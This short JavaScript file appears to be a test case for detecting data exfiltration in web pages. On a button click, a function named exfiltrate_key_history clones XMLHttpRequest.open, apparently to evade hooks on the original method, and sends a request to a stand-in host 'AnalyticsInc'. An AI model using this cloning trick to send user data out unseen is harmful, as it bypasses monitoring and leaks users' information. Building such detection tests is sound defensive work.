/*Function.prototype.clone = function() {
    var that = this;
    var temp = function temporary() { return that.apply(this, arguments); };
    for(var key in this) {
        if (this.hasOwnProperty(key)) {
            temp[key] = this[key];
        }
    }
    return temp;
};
*/
function exfiltrate_key_history() {

    // Clone Function 3
    // Exfiltrate data using XMLHTTP request
	xmlhttp=new XMLHttpRequest();
	xmlhttp.open.clone = function() {
		var that = this;
		var temp = function temporary() { return that.apply(this, arguments); };
		for(var key in this) {
			if (this.hasOwnProperty(key)) {
				temp[key] = this[key];
			}
		}
		return temp;
	};
	xmlhttp.opennew=xmlhttp.open.clone();
	xmlhttp.opennew("GET", "http://AnalyticsInc:8000/submission.html?test=clone3", true);
	xmlhttp.send(null);
	//xmlhttp2=xmlhttp.clone();
    //xmlhttp2.open("GET", "http://AnalyticsInc:8000/submission.html?test=clone3", true);
    //xmlhttp2.send(null);
	
}

document.getElementById('test').onclick = exfiltrate_key_history;
